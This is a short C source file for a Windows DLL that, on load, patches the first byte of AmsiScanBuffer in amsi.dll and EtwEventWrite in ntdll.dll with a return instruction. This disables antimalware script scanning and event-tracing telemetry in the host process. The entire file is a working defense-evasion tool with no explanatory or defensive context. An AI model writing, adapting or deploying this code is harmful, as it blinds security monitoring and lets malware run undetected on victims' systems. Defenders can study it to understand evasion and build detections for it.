#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HINSTANCE amsi;
	HINSTANCE ntdll;

	DWORD amsi_oldprotect;
	DWORD ntdll_oldprotect;
	char patch = 0xC3;

	void* amsiAddr;
	void* ntdllAddr;

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		amsi = LoadLibraryA("amsi.dll");
		ntdll = LoadLibraryA("ntdll.dll");

		if (!amsi || !ntdll) return FALSE;

		amsiAddr = GetProcAddress(amsi, "AmsiScanBuffer");
		ntdllAddr = GetProcAddress(ntdll, "EtwEventWrite");

		if (!amsiAddr || !ntdllAddr) return FALSE;

		VirtualProtect(amsiAddr, 1, PAGE_READWRITE, &amsi_oldprotect);
		VirtualProtect(ntdllAddr, 1, PAGE_READWRITE, &ntdll_oldprotect);
		
		memcpy(amsiAddr, &patch, 1);
		memcpy(ntdllAddr, &patch, 1);

		VirtualProtect(amsiAddr, 1, amsi_oldprotect, &amsi_oldprotect);
		VirtualProtect(ntdllAddr, 1, ntdll_oldprotect, &ntdll_oldprotect);

		break;
	}
	return TRUE;
}